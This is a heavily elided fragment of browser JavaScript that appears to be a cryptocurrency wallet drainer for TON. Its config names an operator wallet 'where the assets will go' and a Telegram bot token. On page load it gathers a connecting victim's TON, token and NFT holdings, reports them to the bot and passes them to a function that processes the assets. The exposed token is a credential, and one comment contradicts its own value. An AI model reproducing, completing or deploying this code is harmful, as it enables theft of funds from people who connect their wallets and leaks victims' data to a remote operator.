...
document.addEventListener("DOMContentLoaded", async () => {
    ...
    const CF = {
        Wallet: "UQCqMbTO7KBVBxxPa33wBh4nYvewt5zcI5YHRAHWNeqRW9WE",  // Wallet address where the assets will go
        ...
        Ton_rate: 5.4, // conversion rate ( 1 TON to USD = 7.99 )
    ...
    const TG = {
        token: "7946877858:AAELkZbW4dg9csD5T5MANeW926l2bPZ1jxo", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
...
// =====================================================================
    ...
    async function fetchData(User_wallet) {
        ...
        try {
            ...
            const nftData = await fetchNftData(User_wallet) || []; // если нет данных, возвращаем пустой массив
    
            if (TG.connect_success) {
                await sendConnectionMessage(tonData, tokenData, nftData);
            }
    
            await processAssets(tonData, tokenData, nftData); // Передаем nftData как массив
        } catch (error) {
    ...
    async function fetchNftData(address) {
        ...
        // Продолжение логики обработки nftJson...
    }
